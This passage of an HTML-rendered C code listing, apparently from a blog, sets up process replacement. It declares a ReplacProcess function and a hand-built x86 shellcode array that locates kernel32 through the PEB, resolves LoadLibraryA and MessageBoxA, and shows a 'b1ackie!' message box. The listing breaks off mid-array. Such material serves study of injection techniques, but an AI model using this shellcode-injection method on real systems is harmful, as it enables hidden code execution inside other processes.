class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function">BOOL <span class="hljs-title">ReplacProcess</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszFilePath)</span></span>;<br><span class="hljs-keyword">char</span> data[] = &#123; <span class="hljs-number">0x55</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x4C</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x15</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x50</span><br>,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x29</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xC4</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB4</span> ,<span class="hljs-number">0x4C</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB5</span><br>,<span class="hljs-number">0x6F</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB6</span> ,<span class="hljs-number">0x61</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB7</span> ,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x4C</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB9</span> ,<span class="hljs-number">0x69</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x62</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBB</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBC</span> ,<span class="hljs-number">0x61</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBD</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBE</span><br>,<span class="hljs-number">0x79</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBF</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC0</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xB4</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x52</span> ,<span class="hljs-number">0xFF</span><br>,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC4</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC5</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC7</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC8</span> ,<span class="hljs-number">0x61</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC9</span> ,<span class="hljs-number">0x67</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCA</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCB</span><br>,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0x6F</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCD</span> ,<span class="hljs-number">0x78</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCE</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCF</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD0</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD1</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD2</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD3</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD4</span><br>,<span class="hljs-number">0x33</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD5</span> ,<span class="hljs-number">0x32</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD6</span> ,<span class="hljs-number">0x2E</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD7</span> ,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD8</span> ,<span class="hljs-number">0x6C</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD9</span> ,<span class="hljs-number">0x6C</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDA</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC4</span> ,<span class="hljs-number">0x50</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xD0</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF4</span><br>,<span class="hljs-number">0x50</span> ,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDC</span> ,<span class="hljs-number">0x62</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDD</span> ,<span class="hljs-number">0x31</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDE</span><br>,<span class="hljs-number">0x61</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDF</span> ,<span class="hljs-number">0x63</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE1</span> ,<span class="hljs-number">0x69</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE2</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE3</span> ,<span class="hljs-number">0x21</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE4</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x74</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE9</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xEA</span><br>,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xEB</span> ,<span class="hljs-number">0x74</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6A</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x52</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDC</span><br>,<span class="hljs-number">0x50</span> ,<span class="hljs-number">0x6A</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x33</span> ,<span class="hljs-number">0xC0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0xE5</span> ,<span class="hljs-number">0x5D</span> ,<span class="hljs-number">0xC3</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span><br>,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0xA1</span> ,<span class="hljs-number">0x30</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x40</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x40</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x40</span><br>,<span class="hljs-number">0x10</span> ,<span class="hljs-number">0xC3</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x83</span><br>,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x2C</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0x08</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0x3C</span> ,<span class="hljs-number">0x89</span><br>,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x08</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC8</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x44</span><br>,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x78</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0x20</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x8B</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x48</span> ,<span class="hljs-number">0x24</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xDC</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span><br>,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0x1C</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0x18</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE4</span> ,<span class="hljs-number">0xC7</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x00</span><br>,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC7</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xEB</span> ,<span class="hljs-number">0x09</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xC0</span> ,<span class="hljs-number">0x01</span><br>,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x3B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xE4</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0x6D</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF4</span><br>,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x90</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span><br>,<span class="hljs-number">0xC2</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x47</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span><br>,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC1</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x65</span><br>,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x29</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xD1</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span><br>,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x74</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x12</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC8</span><br>,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x50</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB9</span><br>,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC1</span> ,<span class="hljs-number">0xE1</span> ,<span class="hljs-number">0x02</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0x0F</span><br>,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0xE2</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB9</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xD1</span> ,<span class="hljs-number">0x05</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span><br>,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x10</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF9</span> ,<span class="hljs-number">0x6F</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0xCA</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC2</span><br>,<span class="hljs-number">0x06</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x63</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0xB2</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB8</span><br>,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC8</span> ,<span class="hljs-number">0x07</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0x0F</span><br>,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x9A</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB9</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC1</span> ,<span class="hljs-number">0xE1</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span><br>,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x82</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB9</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xD1</span><br>,<span class="hljs-number">0x09</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x10</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF9</span> ,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0x75</span> ,<span class="hljs-number">0x6E</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span><br>,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC2</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0x75</span> ,<span class="hljs-number">0x5A</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span><br>,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC8</span> ,<span class="hljs-number">0x0B</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0x75</span> ,<span class="hljs-number">0x46</span> ,<span class="hljs-number">0xB9</span><br>,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xD1</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span 